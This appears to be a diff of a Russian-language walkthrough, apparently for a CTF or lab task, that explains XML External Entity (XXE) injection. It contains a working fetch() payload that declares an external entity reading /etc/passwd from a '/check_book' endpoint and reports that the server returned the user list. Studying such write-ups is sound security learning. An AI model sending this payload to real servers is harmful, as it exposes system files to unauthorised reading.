@@ -21,17 +21,26 @@
 
 XML-запрос отправляется серверу, он обрабатывает этот XML и возвращает ID книги. Можно предположить уязвимость XXE
 
+### Что такое XXE
+
+**XXE (XML External Entity Injection)** - уязвимость, при которой сервер небезопасно обрабатывает XML-данные. Данная уязвимость позволит прочесть файлы сервера, что является одной из самых опасных уязвимостей (В 2017 году занимало ***4-ое место в OWASP Top-10***)
+
 ### Эксплуатация уязвимости
 
 Для проверки уязвимости попробуем отправить XML-запрос через консоль в DevTools
 ```xml
-fetch('/api/endpoint', {
+fetch('/check_book', {
     method: 'POST',
     headers: {'Content-Type': 'application/xml'},
     body: `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [<!ENTITY us SYSTEM "file:///etc/passwd">]>
-<book><id>&us;</id></book>`
-}).then(r => r.text()).then(console.log);
+<!DOCTYPE test [<!ENTITY us SYSTEM "file:///etc/passwd">
+]>
+<book>
+    <id>&us;</id>
+</book>`
+})
+.then(res => res.text())
+.then(console.log);
 ```
 
 Нам вернуло список пользователей Linux. XXE подтверждена
